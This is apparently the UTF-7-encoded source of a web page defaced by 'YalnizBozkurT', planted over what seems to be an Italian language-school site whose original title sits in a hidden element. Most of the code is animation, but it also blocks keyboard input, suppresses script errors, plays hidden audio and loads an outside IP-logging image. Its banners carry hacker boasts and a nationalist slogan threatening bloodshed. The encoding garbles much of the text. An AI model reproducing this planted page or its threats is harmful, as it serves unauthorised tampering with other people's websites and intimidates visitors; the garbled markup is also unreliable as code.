+//setTimeout speed.var s +AD0 0.2+ADs //effect speed.var r,h,w+ADs-var d +AD0 document+ADs-var my +AD0 10+ADs-var mx +AD0 10+ADs-var stp +AD0 0+ADs-var evn +AD0 360/3+ADs-var vx +AD0 new Array()+ADs-var vy +AD0 new Array()+ADs-var vz +AD0 new Array()+ADs-var dy +AD0 new Array()+ADs-var dx +AD0 new Array()+ADs-var pix +AD0 +ACI-px+ACIAOw-var strictmod +AD0 ((document.compatMode) +ACYAJg document.compatMode.indexOf(+ACI-CSS+ACI) +ACEAPQ -1)+ADs-var domWw +AD0 (typeof window.innerWidth +AD0APQ +ACI-number+ACI)+ADs-var domSy +AD0 (typeof window.pageYOffset +AD0APQ +ACI-number+ACI)+ADs-var idx +AD0 d.getElementsByTagName(‘div’).length+ADs-for (i +AD0 0+ADs i +ADw n+ADs i+ACsAKw)+AHs
+var dims +AD0 (i+ACs-1)/2+ADs
+d.write(‘+ADw-div id+AD0AIg-x’+ACs(idx+ACs-i)+ACs’+ACI style+AD0AIg-position:absolute+ADs’
++ACs’top:0px+ADs-left:0px+ADs-width:’+ACs-dims+ACs’px+ADs-height:’+ACs-dims+ACs’px+ADs’
++ACs’background-color:’+ACs-xCol+ACs’+ADs-font-size:’+ACs-dims+ACs’px+ACIAPgA8-/div+AD4′
++ACs’+ADw-div id+AD0AIg-y’+ACs(idx+ACs-i)+ACs’+ACI style+AD0AIg-position:absolute+ADs-top:0px+ADs’
++ACs’left:0px+ADs-width:’+ACs-dims+ACs’px+ADs-height:’+ACs-dims+ACs’px+ADs’
++ACs’background-color:’+ACs-yCol+ACs’+ADs-font-size:’+ACs-dims+ACs’px+ACIAPgA8-/div+AD4′
++ACs’+ADw-div id+AD0AIg-z’+ACs(idx+ACs-i)+ACs’+ACI style+AD0AIg-position:absolute+ADs-top:0px+ADs’
++ACs’left:0px+ADs-width:’+ACs-dims+ACs’px+ADs-height:’+ACs-dims+ACs’px+ADs’
++ACs’background-color:’+ACs-zCol+ACs’+ADs-font-size:’+ACs-dims+ACs’px+ACIAPgA8-/div+AD4′)+ADsAfQ-if (domWw) r +AD0 window+ADs-else+AHs
+if (d.documentElement +ACYAJg
+typeof d.documentElement.clientWidth +AD0APQ +ACI-number+ACI +ACYAJg
+d.documentElement.clientWidth +ACEAPQ 0)
+r +AD0 d.documentElement+ADs
+else
++AHs
+if (d.body +ACYAJg typeof d.body.clientWidth +AD0APQ +ACI-number+ACI)
+r +AD0 d.body+ADs
++AH0AfQ-function winsize()+AHs
+var oh,sy,ow,sx,rh,rw+ADs
+if (domWw)
++AHs
+if (d.documentElement +ACYAJg d.defaultView +ACYAJg
+typeof d.defaultView.scrollMaxY +AD0APQ +ACI-number+ACI)
++AHs
+oh +AD0 d.documentElement.offsetHeight+ADs
+sy +AD0 d.defaultView.scrollMaxY+ADs
+ow +AD0 d.documentElement.offsetWidth+ADs
+sx +AD0 d.defaultView.scrollMaxX+ADs
+rh +AD0 oh-sy+ADs
+rw +AD0 ow-sx+ADs
++AH0
+else
++AHs
+rh +AD0 r.innerHeight+ADs
+rw +AD0 r.innerWidth+ADs
++AH0
+h +AD0 rh+ADs
+w +AD0 rw+ADs
++AH0
+else
++AHs
+h +AD0 r.clientHeight+ADs
+w +AD0 r.clientWidth+ADs
++AH0AfQ-function scrl(yx)+AHs
+var y,x+ADs
+if (domSy)
++AHs
+y +AD0 r.pageYOffset+ADs
+x +AD0 r.pageXOffset+ADs
++AH0
+else
++AHs
+y +AD0 r.scrollTop+ADs
+x +AD0 r.scrollLeft+ADs
++AH0
+return (yx +AD0APQ 0)?y:x+ADsAfQ-function mouse(e)+AHs
+var msy +AD0 (domSy)?window.pageYOffset:0+ADs
+if (+ACE-e) e +AD0 window.event+ADs
+if (typeof e.pageY +AD0APQ ‘number’)
++AHs
+my +AD0 e.pageY – msy +ACs 16+ADs
+mx +AD0 e.pageX +ACs 6+ADs
++AH0
+else
++AHs
+my +AD0 e.clientY – msy +ACs 16+ADs
+mx +AD0 e.clientX +ACs 6+ADs
++AH0
+if (my +AD4 h-65) my +AD0 h-65+ADs
+if (mx +AD4 w-50) mx +AD0 w-50+ADsAfQ-function assgn()+AHs
+for (j +AD0 0+ADs j +ADw 3+ADs j+ACsAKw)
++AHs
+dy+AFs-j+AF0 +AD0 my +ACs 50 +ACo Math.cos(stp+ACs-j+ACo-evn+ACo-Math.PI/180) +ACo Math.sin((stp+ACs-j+ACo-25)/2) +ACs scrl(0) +ACs pix+ADs
+dx+AFs-j+AF0 +AD0 mx +ACs 50 +ACo Math.sin(stp+ACs-j+ACo-evn+ACo-Math.PI/180) +ACo Math.sin((stp+ACs-j+ACo-25)/2) +ACo Math.sin(stp/4) +ACs pix+ADs
++AH0
+stp+ACsAPQ-s+ADs
+for (i +AD0 0+ADs i +ADw n+ADs i+ACsAKw)
++AHs
+if (i +ADw n-1)
++AHs
+vx+AFs-i+AF0.top +AD0 vx+AFs-i+ACs-1+AF0.top+ADs vx+AFs-i+AF0.left +AD0 vx+AFs-i+ACs-1+AF0.left+ADs
+vy+AFs-i+AF0.top +AD0 vy+AFs-i+ACs-1+AF0.top+ADs vy+AFs-i+AF0.left +AD0 vy+AFs-i+ACs-1+AF0.left+ADs
+vz+AFs-i+AF0.top +AD0 vz+AFs-i+ACs-1+AF0.top+ADs vz+AFs-i+AF0.left +AD0 vz+AFs-i+ACs-1+AF0.left+ADs
++AH0
+else
++AHs
+vx+AFs-i+AF0.top +AD0 dy+AFs-0+AF0AOw vx+AFs-i+AF0.left +AD0 dx+AFs-0+AF0AOw
+vy+AFs-i+AF0.top +AD0 dy+AFs-1+AF0AOw vy+AFs-i+AF0.left +AD0 dx+AFs-1+AF0AOw
+vz+AFs-i+AF0.top +AD0 dy+AFs-2+AF0AOw vz+AFs-i+AF0.left +AD0 dx+AFs-2+AF0AOw
++AH0
++AH0
+setTimeout(assgn,t)+ADsAfQ-function init()+AHs
+for (i +AD0 0+ADs i +ADw n+ADs i+ACsAKw)
++AHs
+vx+AFs-i+AF0 +AD0 document.getElementById(+ACI-x+ACIAKw(idx+ACs-i)).style+ADs
+vy+AFs-i+AF0 +AD0 document.getElementById(+ACI-y+ACIAKw(idx+ACs-i)).style+ADs
+vz+AFs-i+AF0 +AD0 document.getElementById(+ACI-z+ACIAKw(idx+ACs-i)).style+ADs
++AH0
+winsize()+ADs
+assgn()+ADsAfQ-if (window.addEventListener)+AHs
+window.addEventListener(+ACI-resize+ACI,winsize,false)+ADs
+window.addEventListener(+ACI-load+ACI,init,false)+ADs
+document.addEventListener(+ACI-mousemove+ACI,mouse,false)+ADsAfQ
+else if (window.attachEvent)+AHs
+window.attachEvent(+ACI-onload+ACI,init)+ADs
+document.attachEvent(+ACI-onmousemove+ACI,mouse)+ADs
+window.attachEvent(+ACI-onresize+ACI,winsize)+ADsAfQ +ADw-/script+AD4
++ADw-EMBED src+AD0AIg-http://www.muhiddin.net/mehter/11.php+ACI width+AD0-0 height+AD0-0 type+AD0-audio/mpeg loop+AD0AIg-true+ACI autostart+AD0AIg-true+ACIAPgA8-/embed+AD4 +ADw-/font+AD4
++ADw-/div+AD4APA-/b+AD4APA-/body+AD4APA-/html+AD4
++ADw-script type+AD0AIg-text/javascript+ACI src+AD0AIg-http://analytics.hosting24.com/count.php+ACIAPgA8-/script+AD4
++ADw-noscript+AD4APA-a href+AD0AIg-http://www.hosting24.com/+ACIAPgA8-img src+AD0AIg-http://analytics.hosting24.com/count.php+ACI alt+AD0AIg-web hosting+ACI /+AD4APA-/a+AD4APA-/noscript+AD4
++ADw-img src+AD0AIg-http://i357.photobucket.com/albums/oo15/leelee123+AF8-a25/hacked.gif+ACI border+AD0AIg-0+ACI alt+AD0AIg-Photobucket+ACIAPgA8-/a+AD4
++ADw-b+AD4APA-/b+AD4APA-br+AD4
++ADw-br+AD4
++ADw-span class+AD0AIg-style12+ACIAPgA8-/b+AD4 +ADw-span class+AD0AIg-style13+ACIAPgA8-marquee+AD4-CaN+ACYAIw-305+ADs YaNaN SaBReTSiN, CaN+ACYAIw-305+ADs YaKaNDa YaNaCaG+ACYAIw-305+ADs G+APw-N+APw BeKLeSiN.. +ACEAIQAh +AFs HZ MuHaMMeD s.a.v +AF0APA-/marquee+AD4APA-/span+AD4APA-/span+AD4 +ADw-br+AD4
++ADw-br+AD4
++ADw-br /+AD4
++ADw-body onkeydown+AD0AIg-return false+ACIAPg
++ADwAIQ—hacked by YalnizBozkurT–+AD4
++ADwAIQ—hacked by Yalniz-BozkurT–+AD4
++ADw-/body+AD4
++ADw-/html+AD4APA-DIV style+AD0AIg-DISPLAY: none+ACIAPgA8-xmp+AD4-: Home
+Inglese e altre Lingue straniere - Italiano per Stranieri - TEFL - Language System College
++ADw-/title+AD4APA-html+AD4
++ADw-head+AD4
++ADw-title+AD4-H4CK3D YalnizBozkurT+ADw-/title+AD4
++ADw-body background+AD0AIg-http://d1303.hizliresim.com/17/r/lcxmp.gif+ACI bgcolor+AD0AIg-black+ACIAPg
++ADw-link rel+AD0AIg-icon+ACI href+AD0AIg-http://icons.iconarchive.com/icons/iconscity/flags/16/turkey-icon.png+ACI type+AD0AIg-T+APw-rk Bayra+ACYAIw-287+ADsAJgAj-305+ADs icon+ACI /+AD4
++ADw-a+AD4APA-img src+AD0 +ACI-http://imageshack.us/a/img823/609/images2ccy.jpg+ACI title+AD0 +ACI-HACKER YalnizBozkurT+ACI width+AD0-200+ACI height+AD0AIg-150+ACI align+AD0AIg-right+ACIAPgA8-/a+AD4
++ADw-a+AD4APA-img src+AD0 +ACI-http://imageshack.us/a/img41/6813/57809150.jpg+ACI title+AD0 +ACI-HACKER YalnizBozkurT+ACI width+AD0-200+ACI height+AD0AIg-150+ACI align+AD0AIg-left+ACIAPgA8-center+AD4
++ADw-center+AD4APA-img src+AD0AIg-http://r1308.hizliresim.com/1d/6/r6x9c.png+ACIAPgA8-/img+AD4
++ADw-/head+AD4
++ADw-body bgcolor+AD0-0+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPgA8-/center+AD4APA-/div+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPgA8-/script+AD4
++ADw-style+AD4-/+ACo-Kod Dostu Cursor START+ACo-/ body, a:hover, h2, h1, table, td, div, p, img+AHs-cursor: url(http://cur.cursors-4u.net/cursors/cur-8/cur756.cur), progress +ACE-important+ADsAfQ /+ACo-Kod Dostu Cursor STOP+ACo-/+ADw-/style+AD4
++ADw-a +ADw-img src+AD0AIg-http://in3.sitekodlari.com/ipadresi6.php+ACI border+AD0AIg-0+ACI alt+AD0AIg-ip adresi+ACIAPgA8-/a+AD4
++ADw-style+AD4
+body +AHs
+background: +ACM-000000 url() no-repeat top center+ADs
+color: +ACM-ff0000+ADs
+font-family: Courier New+ADs
+font-size: 12px+ADs
++AH0
++ACM-black+AHs
+text-align: center+ADs
+font-size:12px+ADs
+font-weight: bold+ADs
++AH0
+a:link, a:visited +AHs-font-weight:normal+ADs text-decoration:none+ADs color:+ACM-ffF000+ADsAfQ
+a:hover +AHs-font-weight:bold+ADs text-decoration:none+ADs cursor:help+ADsAfQ
+.style1 +AHs
+font-family: Georgia, +ACI-Times New Roman+ACI, Times, serif+ADs
+font-size: 16px+ADs
++AH0
+.style2 +AHs-color: +ACM-FFFFFF+AH0
+.style4 +AHs-font-size: 12px+AH0
+.style5 +AHs
+font-size: medium+ADs
+font-weight: bold+ADs
+font-family: +ACI-Courier New+ACI, Courier, monospace+ADs
++AH0
+.style7 +AHs
+font-size: large+ADs
+font-weight: bold+ADs
+color: +ACM-FFFFFF+ADs
++AH0
+.style11 +AHs
+font-size: x-large+ADs
+color: +ACM-FFFFFF+ADs
++AH0
+.style12 +AHs-color: +ACM-S+ADs font-size: large+AH0
+.style13 +AHs-color: +ACM-FFFFFF+ADs font-size: medium+ADs font-weight: bold+ADs color: +ACM-FF0000+ADsAfQ
+.style14 +AHs-color: +ACM-FFFFFF+ADs font-size: large+ADs font-weight: bold+ADsAfQ
+.style15 +AHs-color: +ACM-FFFFFF+ADs font-size: large+ADs +AH0
+.style16 +AHs-font-weight: bold+AH0
++ADw-/style+AD4
++ADw-head+AD4
++ADw-script language+AD0AIg-Hacked Yalniz Bozkurt+ACIAPg
+function ClearError() +AHs-return true+ADsAfQ
+window.onerror +AD0 ClearError+ADs
++ADw-/script+AD4
++ADw-div align+AD0AIg-center+ACIAPgA8-table width+AD0AIg-70+ACUAIg border+AD0AIg-0+ACIAPg
++ADw-tbody+AD4APA-tr+AD4APA-td+AD4APA-p+AD4 +ADw-/p+AD4
++ADw-center+AD4
++ADw-font size+AD0AIg-6+ACI face+AD0AIg-snap itc+ACIAPgA8-b+AD4APA-span id+AD0AIg-lightf+AF8-light+ACIAPgA8-/span+AD4APA-/b+AD4APA-/font+AD4
++ADw-script+AD4
+lightf+AF8-lightcolor1+AD0	+ACI-FFFFFF+ACI
+lightf+AF8-lightcolor2+AD0	+ACI-FFFFFF+ACI
+lightf+AF8-speed+AD0		75
+color+AF8-mesk+AD0-new Array()+ADs
+color+AF8-mesk+AFs-10+AF0APQAi-A+ACIAOw
+color+AF8-mesk+AFs-11+AF0APQAi-B+ACIAOw
+color+AF8-mesk+AFs-12+AF0APQAi-C+ACIAOw
+color+AF8-mesk+AFs-13+AF0APQAi-D+ACIAOw
+color+AF8-mesk+AFs-14+AF0APQAi-E+ACIAOw
+color+AF8-mesk+AFs-15+AF0APQAi-F+ACIAOw
+color+AF8-A+AD0-10+ADs
+color+AF8-B+AD0-11+ADs
+color+AF8-C+AD0-12+ADs
+color+AF8-D+AD0-13+ADs
+color+AF8-E+AD0-14+ADs
+color+AF8-F+AD0-15+ADs
+color+AF8-let+AD0AIg-ABCDEF+ACIAOw
+function color+AF8-mes(color+AF8-num)
++AHs
+if(color+AF8-let.indexOf(color+AF8-num) +ACEAPQ -1)
++AHs
+return eval(+ACI-color+AF8AIg +ACs color+AF8-num)
++AH0
+else
++AHs
+if(color+AF8-num +ADw 10)
++AHs
+return eval(color+AF8-num)
++AH0
+else
++AHs
+return color+AF8-mesk+AFs-color+AF8-num+AF0AOw
++AH0
++AH0
++AH0
+function color(color+AF8-begin,color+AF8-einde,color+AF8-stappen,color+AF8-stap)
++AHs
+color+AF8-hh1+AD0(color+AF8-mes(color+AF8-begin.charAt(0))+ACo-16)+ACs-color+AF8-mes(color+AF8-begin.charAt(1))+ADs
+color+AF8-hh2+AD0(color+AF8-mes(color+AF8-begin.charAt(2))+ACo-16)+ACs-color+AF8-mes(color+AF8-begin.charAt(3))+ADs
+color+AF8-hh3+AD0(color+AF8-mes(color+AF8-begin.charAt(4))+ACo-16)+ACs-color+AF8-mes(color+AF8-begin.charAt(5))+ADs
+color+AF8-pp1+AD0(color+AF8-mes(color+AF8-einde.charAt(0))+ACo-16)+ACs-color+AF8-mes(color+AF8-einde.charAt(1))+ADs
+color+AF8-pp2+AD0(color+AF8-mes(color+AF8-einde.charAt(2))+ACo-16)+ACs-color+AF8-mes(color+AF8-einde.charAt(3))+ADs
+color+AF8-pp3+AD0(color+AF8-mes(color+AF8-einde.charAt(4))+ACo-16)+ACs-color+AF8-mes(color+AF8-einde.charAt(5))+ADs
+if(color+AF8-hh1 +ADw color+AF8-pp1)
++AHs
+color+AF8-ff1+AD0-color+AF8-hh1+ACs-Math.floor((color+AF8-pp1-color+AF8-hh1)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff1+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff1/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff1-(Math.floor(color+AF8-ff1/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+else
++AHs
+color+AF8-ff1+AD0-color+AF8-hh1-Math.floor((color+AF8-hh1-color+AF8-pp1)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff1+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff1/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff1-(Math.floor(color+AF8-ff1/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+if(color+AF8-hh2 +ADw color+AF8-pp2)
++AHs
+color+AF8-ff2+AD0-color+AF8-hh2+ACs-Math.floor((color+AF8-pp2-color+AF8-hh2)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff2+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff2/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff2-(Math.floor(color+AF8-ff2/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+else
++AHs
+color+AF8-ff2+AD0-color+AF8-hh2-Math.floor((color+AF8-hh2-color+AF8-pp2)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff2+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff2/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff2-(Math.floor(color+AF8-ff2/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+if(color+AF8-hh3 +ADw color+AF8-pp3)
++AHs
+color+AF8-ff3+AD0-color+AF8-hh3+ACs-Math.floor((color+AF8-pp3-color+AF8-hh3)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff3+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff3/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff3-(Math.floor(color+AF8-ff3/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+else
++AHs
+color+AF8-ff3+AD0-color+AF8-hh3-Math.floor((color+AF8-hh3-color+AF8-pp3)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff3+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff3/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff3-(Math.floor(color+AF8-ff3/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+return color+AF8-ff1+ACs-color+AF8-ff2+ACs-color+AF8-ff3
++AH0
+lightf+AF8-num+AD0-0+ADs
+lightf+AF8-num2+AD0-0+ADs
+lightf+AF8-txt+AD0-new Array()+ADs
+lightf+AF8-txt+AFs-0+AF0APQAiACIAOw
+function lightf()
++AHs
+for(lightf+AF8-i+AD0-0+ADs-lightf+AF8-i +ACEAPQ Math.floor(lightf+AF8-message.length/2)+ADs-lightf+AF8-i+ACsAKw)
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-i+AF0APQ-color(lightf+AF8-lightcolor1,lightf+AF8-lightcolor2,Math.floor(lightf+AF8-message.length/2),lightf+AF8-i)+ADs
++AH0
+for(lightf+AF8-i+AD0-Math.floor(lightf+AF8-message.length/2)+ADs-lightf+AF8-i +ACEAPQ lightf+AF8-message.length+ADs-lightf+AF8-i+ACsAKw)
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-i+AF0APQ-color(lightf+AF8-lightcolor2,lightf+AF8-lightcolor1,Math.floor(lightf+AF8-message.length/2),(lightf+AF8-i-Math.floor(lightf+AF8-message.length/2)))+ADs
++AH0
+lightf+AF8-lightf1()+ADs
++AH0
+function lightf+AF8-lightf1()
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0APQAiACIAOw
+lightf+AF8-num2+AD0-lightf+AF8-message.length-lightf+AF8-num+ADs
+for(lightf+AF8-i+AD0-0+ADs-lightf+AF8-i +ACEAPQ lightf+AF8-message.length+ADs-lightf+AF8-i+ACsAKw)
++AHs
+if(lightf+AF8-i+ACs-lightf+AF8-num +ADw lightf+AF8-message.length)
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0APQ-lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0AKwAiADw-font color+AD0′+ACMAIgAr-lightf+AF8-txt+AFs(lightf+AF8-i+ACs-lightf+AF8-num)+AF0AKwAi’+AD4AIgAr-lightf+AF8-message.charAt(lightf+AF8-i)+ACsAIgA8-/font+AD4AIgA7
++AH0
+else
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0APQ-lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0AKwAiADw-font color+AD0′+ACMAIgAr-lightf+AF8-txt+AFs-lightf+AF8-i-lightf+AF8-num2+AF0AKwAi’+AD4AIgAr-lightf+AF8-message.charAt(lightf+AF8-i)+ACsAIgA8-/font+AD4AIgA7
++AH0
++AH0
+if(lightf+AF8-num +ACEAPQ lightf+AF8-message.length)
++AHs
+lightf+AF8-num+ACsAKwA7
++AH0
+else
++AHs
+lightf+AF8-num+AD0-0+ADs
++AH0
+lightf+AF8-light.innerHTML+AD0-lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0AOw
+setTimeout(+ACI-lightf+AF8-lightf1()+ACI,lightf+AF8-speed)
++AH0
+lightf()+ADs
++ADw-/script+AD4APA-/center+AD4
++ADw-/br+AD4
++ADw-style type+AD0AIg-text/css+ACIAPg
+BODY +AHs
+SCROLLBAR-FACE-COLOR: +ACM-000000+ADs SCROLLBAR-HIGHLIGHT-COLOR: +ACM-000000+ADs SCROLLBAR-SHADOW-COLOR: +ACM-000000+ADs SCROLLBAR-3DLIGHT-COLOR: +ACM-000000+ADs SCROLLBAR-ARROW-COLOR: +ACM-ffffff+ADs SCROLLBAR-TRACK-COLOR: +ACM-ffffff+ADs FONT-FAMILY: Courier New+ADs SCROLLBAR-DARKSHADOW-COLOR: +ACM-000000
++AH0
+.Estilo10 +AHs
+COLOR: +ACM-ffffff+ADs FONT-FAMILY: Courier New
++AH0
+.Estilo8 +AHs
+FONT-SIZE: 10px+ADs COLOR: +ACM-ffffff+ADs FONT-FAMILY: Courier New
++AH0
++ADw-/style+AD4
++ADw-script language+AD0AIg-JavaScript+ACIAPg
+TypingText +AD0 function(element, interval, cursor, finishedCallback) +AHs
+if((typeof document.getElementById +AD0APQ +ACI-undefined+ACI) +AHwAfA (typeof element.innerHTML +AD0APQ +ACI-undefined+ACI)) +AHs
+this.running +AD0 true+ADs
+return+ADs
++AH0
+this.element +AD0 element+ADs
+this.finishedCallback +AD0 (finishedCallback ? finishedCallback : function() +AHs return+ADs +AH0)+ADs
+this.interval +AD0 (typeof interval +AD0APQ +ACI-undefined+ACI ? 20 : interval)+ADs
+this.origText +AD0 this.element.innerHTML+ADs
+this.unparsedOrigText +AD0 this.origText+ADs
+this.cursor +AD0 (cursor ? cursor : +ACIAIg)+ADs
+this.currentText +AD0 +ACIAIgA7
+this.currentChar +AD0 0+ADs
+this.element.typingText +AD0 this+ADs
+if(this.element.id +AD0APQ +ACIAIg) this.element.id +AD0 +ACI-typingtext+ACI +ACs TypingText.currentIndex+ACsAKwA7
+TypingText.all.push(this)+ADs
+this.running +AD0 false+ADs
+this.inTag +AD0 false+ADs
+this.tagBuffer +AD0 +ACIAIgA7
+this.inHTMLEntity +AD0 false+ADs
+this.HTMLEntityBuffer +AD0 +ACIAIgA7
++AH0
+TypingText.all +AD0 new Array()+ADs
+TypingText.currentIndex +AD0 0+ADs
+TypingText.runAll +AD0 function() +AHs
+for(var i +AD0 0+ADs i +ADw TypingText.all.length+ADs i+ACsAKw) TypingText.all+AFs-i+AF0.run()+ADs
++AH0
+TypingText.prototype.run +AD0 function() +AHs
+if(this.running) return+ADs
+if(typeof this.origText +AD0APQ +ACI-undefined+ACI) +AHs
+setTimeout(+ACI-document.getElementById(‘+ACI +ACs this.element.id +ACs +ACI’).typingText.run()+ACI, this.interval)+ADs
+return+ADs
++AH0
+if(this.currentText +AD0APQ +ACIAIg) this.element.innerHTML +AD0 +ACIAIgA7
+if(this.currentChar +ADw this.origText.length) +AHs
+if(this.origText.charAt(this.currentChar) +AD0APQ +ACIAPAAi +ACYAJg +ACE-this.inTag) +AHs
+this.tagBuffer +AD0 +ACIAPAAiADs
+this.inTag +AD0 true+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.origText.charAt(this.currentChar) +AD0APQ +ACIAPgAi +ACYAJg this.inTag) +AHs
+this.tagBuffer +ACsAPQ +ACIAPgAiADs
+this.inTag +AD0 false+ADs
+this.currentText +ACsAPQ this.tagBuffer+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.inTag) +AHs
+this.tagBuffer +ACsAPQ this.origText.charAt(this.currentChar)+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.origText.charAt(this.currentChar) +AD0APQ +ACIAJgAi +ACYAJg +ACE-this.inHTMLEntity) +AHs
+this.HTMLEntityBuffer +AD0 +ACIAJgAiADs
+this.inHTMLEntity +AD0 true+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.origText.charAt(this.currentChar) +AD0APQ +ACIAOwAi +ACYAJg this.inHTMLEntity) +AHs
+this.HTMLEntityBuffer +ACsAPQ +ACIAOwAiADs
+this.inHTMLEntity +AD0 false+ADs
+this.currentText +ACsAPQ this.HTMLEntityBuffer+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.inHTMLEntity) +AHs
+this.HTMLEntityBuffer +ACsAPQ this.origText.charAt(this.currentChar)+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else +AHs
+this.currentText +ACsAPQ this.origText.charAt(this.currentChar)+ADs
++AH0
+this.element.innerHTML +AD0 this.currentText+ADs
+this.element.innerHTML +ACsAPQ (this.currentChar +ADw this.origText.length – 1 ? (typeof this.cursor +AD0APQ +ACI-function+ACI ? this.cursor(this.currentText) : this.cursor) : +ACIAIg)+ADs
+this.currentChar+ACsAKwA7
+setTimeout(+ACI-document.getElementById(‘+ACI +ACs this.element.id +ACs +ACI’).typingText.run()+ACI, this.interval)+ADs
++AH0 else +AHs
+this.currentText +AD0 +ACIAIgA7
+this.currentChar +AD0 0+ADs
+this.running +AD0 false+ADs
+this.finishedCallback()+ADs
++AH0
++AH0
++ADw-/script+AD4
++ADw-style+AD4
+td+AHs-font-family: courier new+ADs font-size: 9pt+ADs color: red+AH0
+a+AHs-font-family: courier new+ADs font-size: 12pt+ADs color: red+AH0
++ADw-/style+AD4
++ADw-/p+AD4
++ADw-div id+AD0AIg-example1+ACIAPgA8-/div+AD4
++ADw-p align+AD0AIg-center+ACI id+AD0AIg-example2+ACIAPg +ADw-span class+AD0AIg-style5+ACIAPgA8-span class+AD0AIg-style11+ACIAPg-Ne Mutlu Ki Bana Hem T+ANw-RK Hemde +ANw-LK+ANw-C+ANw Do+ACYAIw-287+ADs-mu+ACYAIw-351+ADs-um+ADw-/br+AD4
+——————————————-+ADw-/br+AD4
+Mevzu Bahis Vatansa Gerisi Teferruatt+ACYAIw-305+ADs-r+ADw-/br+AD4
+——————————————-+ADw-/br+AD4
+Bazen Bir +ACYAIw-350+ADs-eyleri De+ACYAIw-287+ADs-i+ACYAIw-351+ADs-tirmek Gerekir…+ADw-/br+AD4
+Sometimes Must Be Something…+ADw-/br+AD4
+——————————————-+ADw-/br+AD4APA-/span+AD4 +ADw-/span+AD4
++ADw-span class+AD0AIg-style12+ACIAPgA8-/b+AD4 +ADw-span class+AD0AIg-style13+ACIAPgA8-/br+AD4
+———————————- +ADw-/br+AD4
++AHw BOZKURT Y+APw-reklilere Selam Olsun. +AHwAPA-/br+AD4
+———————————-+ADw-/br+AD4
++ADw-/span+AD4APA-/span+AD4
++ADw-br+AD4
++ADw-span class+AD0AIg-style7+ACIAPg-Ya Kan Kustururuz Ya da Sonsuza Dek Sustururuz+ACEAIQA8-/span+AD4APA-/p+AD4
++ADw-p+AD4APA-span class+AD0AIg-style4+ACIAPg
++ADw-script type+AD0AIg-text/javascript+ACIAPg
++ADw-/script+AD4
++ADw-/span+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPgA8-/script+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPg
+new TypingText(document.getElementById(+ACI-example1+ACI))+ADs
+new TypingText(document.getElementById(+ACI-example2+ACI), 12, function(i)+AHs
+var ar +AD0 new Array(+ACIAPAAi,+ACI +ACI,+ACI-/+ACI,+ACIAPgAi)+ADs return +ACI +ACI +ACs ar+AFs-i.length +ACU
+ar.length+AF0AOw +AH0)+ADs
+TypingText.runAll()+ADs
++ADw-/script+AD4
++ADw-br+AD4
++ADw-/p+AD4
++ADw-p align+AD0AIg-center+ACIAPgA8-span class+AD0AIg-style14+ACIAPg D+APw-sman Senaryo Yazar…Biz +ACYAIw-304+ADs-se TAR+ACYAIw-304+ADs-H+ADw-br/+AD4
++ADw-br/+AD4
++ACYAIw-304+ADs-LET+ACYAIw-304+ADsAJgAj-350+ADsAJgAj-304+ADs-M+ADw-br/+AD4
++ADw-a href+AD0AIg-http://www.facebook.com/cCcYalnizBozkurT+ACIAPgA8-img src+AD0AIg-http://legacytechnologyservices.files.wordpress.com/2013/08/facebook-32×32-icon.png?w+AD0-625+ACI border+AD0AIg-0+ACI alt+AD0AIg-YalnizBozkurT+ACI title+AD0AIg-YalnizBozkurT+ACI width+AD0AIg-32+ACI height+AD0AIg-32+ACIAPgA8-/a+AD4
++ADw-br /+AD4
++ADw-center+AD4
++ADw-/p+AD4
++ADw-marquee+AD4
